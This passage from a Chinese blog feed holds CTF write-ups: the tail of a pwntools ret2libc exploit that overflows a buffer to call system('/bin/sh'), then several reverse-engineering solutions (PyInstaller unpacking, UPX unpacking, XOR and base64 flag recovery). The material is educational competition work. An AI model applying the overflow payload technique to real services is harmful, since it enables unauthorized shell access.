data-num=\"1\"></td><td><pre>base_address <span class=\"token operator\">=</span> puts_address <span class=\"token operator\">-</span> <span class=\"token number\">0x080970</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>system_address <span class=\"token operator\">=</span> base_address <span class=\"token operator\">+</span> <span class=\"token number\">0x04f420</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>binsh_address <span class=\"token operator\">=</span> base_address <span class=\"token operator\">+</span> <span class=\"token number\">0x1b3d88</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x400506</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">32</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Show me your magic again\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># sh.sendline(payload2)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最终的运行结果如下所示：</p>\n<p><img data-src=\"image-20231011200839136.png\" alt=\"image-20231011200839136\"></p>\n<p><code>flag&#123;f5d55c23-cdfd-4170-9cb8-db66ac3ed237&#125;</code></p>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"pzthon\"><a class=\"markdownIt-Anchor\" href=\"#pzthon\">#</a> PZthon</h3>\n<p>使用 DIE 进行扫描可以发现，该文件没有加壳，但是该程序是使用 PyInstaller 进行打包的，于是我们需要使用 python 的解包工具。</p>\n<p><img data-src=\"image-20231012151805680.png\" alt=\"image-20231012151805680\"></p>\n<p>我们使用以下代码下载一个 exe 解包工具，在同一目录下使用。</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/extremecoders-re/pyinstxtractor.git</pre></td></tr></table></figure><pre><code>python .\\pyinstxtractor.py .\\PZthon.exe\n</code></pre>\n<p><img data-src=\"image-20231012155024222.png\" alt=\"image-20231012155024222\"></p>\n<p>magic number 是在 pyc 文件开头的一段表示 python 版本的数，解包出来的 pyc 文件很可能会 magic number 缺失，需要手动补全。解包完成后，我们需要保证 magic number 的一致，比较 PZthon.pyc 和 struct.pyc 的前几位，发现没有 magic number，不需要补充。</p>\n<p>接下来下载如下工具，进行反编译为 py：</p>\n<pre><code>https://github.com/cw2k/pycdc_withExe/releases/tag/1%2C0\n</code></pre>\n<p>使用如下代码，将 PZthon 代码反编译为 py</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>.<span class=\"token punctuation\">\\</span>pycdc.exe .<span class=\"token punctuation\">\\</span>PZthon.pyc <span class=\"token operator\">></span> .<span class=\"token punctuation\">\\</span>PZthon.py</pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1QWnRob24tb2kybHMzdC5weQ==\">打开 PZthon.py</span>，得到如下内容：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Source Generated with Decompyle++</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># File: PZthon.pyc (Python 3.9)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    art <span class=\"token operator\">=</span> <span class=\"token string\">'\\n              ___                                                                      \\n    //   ) )     / /    //   ) )  // | |     / /        // | |  \\\\ / / \\\\    / /       \\n   //___/ /     / /    //        //__| |    / /        //__| |   \\\\  /   \\\\  / /        \\n  / ____ /     / /    //  ____  / ___  |   / /        / ___  |   / /     \\\\/ /         \\n //           / /    //    / / //    | |  / /        //    | |  / /\\\\     / /          \\n//           / /___ ((____/ / //     | | / /____/ / //     | | / /  \\\\   / /           \\n                                                                                       \\n     / /        //   / / ||   / / //   / /  / /       /__  ___/ ||   / |  / / //   ) ) \\n    / /        //____    ||  / / //____    / /          / /     ||  /  | / / //   / /  \\n   / /        / ____     || / / / ____    / /          / /      || / /||/ / //   / /   \\n  / /        //          ||/ / //        / /          / /       ||/ / |  / //   / /    \\n / /____/ / //____/ /    |  / //____/ / / /____/ /   / /        |  /  | / ((___/ /     \\n'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>art<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Please give me the flag: '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">115</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">121</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token number\">110</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">76</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">96</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">88</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">113</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token number\">103</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token number\">96</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">70</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token number\">118</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token number\">123</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token number\">113</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token number\">69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token number\">79</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token number\">82</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token number\">84</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token number\">89</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token number\">84</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token number\">77</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token number\">76</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token number\">99</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token number\">102</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token number\">86</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token number\">104</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>data <span class=\"token operator\">=</span> hello<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'WOW!!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'I believe you can do it!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'To be continue...'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>可以发现，flag 就是将每个字符和 21 进行了异或操作，我们只需要每个字符再和 21 进行一次异或操作就可以获得 flag 的 ASCII 值，再转换为 ASCII 码即可得到正确的 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">115</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">121</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token number\">110</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">76</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">96</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">88</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">113</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">103</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">96</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">70</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token number\">118</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token number\">123</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token number\">113</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token number\">79</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">82</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">84</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">89</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token number\">84</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">77</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token number\">76</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token number\">99</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token number\">102</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token number\">86</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token number\">104</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>ascii_string <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> enc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ascii_string<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>flag&#123;Y0uMade1tThr0ughT2eSec0ndPZGALAXY1eve1T2at1sC001&#125;</code></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/08/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20RE/",
            "url": "http://yanagi-kon.github.io/2023/10/08/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20RE/",
            "title": "NewStarCTF 2023 公开赛道 RE题目",
            "date_published": "2023-10-08T06:31:00.000Z",
            "content_html": "<h2 id=\"newstarctf-2023-公开赛道-re\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-re\">#</a> NewStarCTF 2023 公开赛道 RE</h2>\n<h3 id=\"easy_re\"><a class=\"markdownIt-Anchor\" href=\"#easy_re\">#</a> easy_RE</h3>\n<p><strong>考点：shift+F12</strong></p>\n<p>打开 IDA 就可以看到一半的 flag：</p>\n<p>![image-20231008143237939](NewStarCTF 2023 公开赛道 RE/image-20231008143237939.png)</p>\n<p>另一半 flag 使用  <code>shift F12</code>  查看字符串，可以查找到</p>\n<p>![image-20231008143316980](NewStarCTF 2023 公开赛道 RE/image-20231008143316980.png)</p>\n<p>flag： <code>flag&#123;we1c0me_to_rev3rse!!&#125;</code></p>\n<h3 id=\"壳\"><a class=\"markdownIt-Anchor\" href=\"#壳\">#</a> 壳</h3>\n<p><strong>考点</strong>：<strong>UPX 壳</strong></p>\n<p>使用 DIE 工具进行查壳：</p>\n<p>![image-20231008144157636](NewStarCTF 2023 公开赛道 RE/image-20231008144157636.png)</p>\n<p>发现是 UPX4.02，那么只需要用高版本 UPX 工具，即可脱壳。使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VweC91cHgvcmVsZWFzZXM=\"> UPX 脱壳工具</span>进行脱壳，</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>upx <span class=\"token parameter variable\">-d</span> E:<span class=\"token punctuation\">\\</span>ramDownLoad<span class=\"token punctuation\">\\</span>KE.exe</pre></td></tr></table></figure><p>![image-20231008150024506](NewStarCTF 2023 公开赛道 RE/image-20231008150024506.png)</p>\n<p>脱壳后再使用 IDA 打开程序，查看 main 函数，可以发现，程序将 flag 的每个字符 + 1，然后喝 enc 进行比较：</p>\n<p>![image-20231008150903238](NewStarCTF 2023 公开赛道 RE/image-20231008150903238.png)</p>\n<p>于是我们双击 enc，获取到 enc 的值，再将 enc 的每个字符 - 1，就可以得到 flag：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token string\">b'gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> enc<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231008151250083](NewStarCTF 2023 公开赛道 RE/image-20231008151250083.png)</p>\n<p><code>flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</code></p>\n<h3 id=\"segments\"><a class=\"markdownIt-Anchor\" href=\"#segments\">#</a> Segments</h3>\n<p><strong>考点：</strong> <code>shift+F7</code></p>\n<p>IDA 打开题目，提示我们 使用  <code>shift+F7</code> ：</p>\n<p>![image-20231008191757619](NewStarCTF 2023 公开赛道 RE/image-20231008191757619.png)</p>\n<p>打开 segment 窗口：</p>\n<p>![image-20231008192402656](NewStarCTF 2023 公开赛道 RE/image-20231008192402656.png)</p>\n<p>可以发现，flag 被拆分为了许多段。</p>\n<p you_ar3_g00d_at_f1nding_elf_segments_name>flag 为 ： flag</p>\n<h3 id=\"elf\"><a class=\"markdownIt-Anchor\" href=\"#elf\">#</a> ELF</h3>\n<p><strong>考点：了解 ELF 文件，基本异或操作</strong></p>\n<p>打开 IDA，进入主函数，可以发现 flag 先进行了一次 encode 操作，对每一个字符都和 32 进行了与操作，并＋16：</p>\n<p>![image-20231008194607787](NewStarCTF 2023 公开赛道 RE/image-20231008194607787.png)</p>\n<p>随后进行 base64 加密，base64 的密码本是正常的，可以放心解密：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> base64 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">b'VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s1 <span class=\"token operator\">=</span> b64decode<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">-</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得出 flag： <code>flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</code></p>\n<p>![image-20231008201358737](NewStarCTF 2023 公开赛道 RE/image-20231008201358737.png)</p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/",
            "url": "http://yanagi-kon.github.io/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/",
            "title": "IDA 使用",
            "date_published": "2023-10-05T09:06:00.000Z",
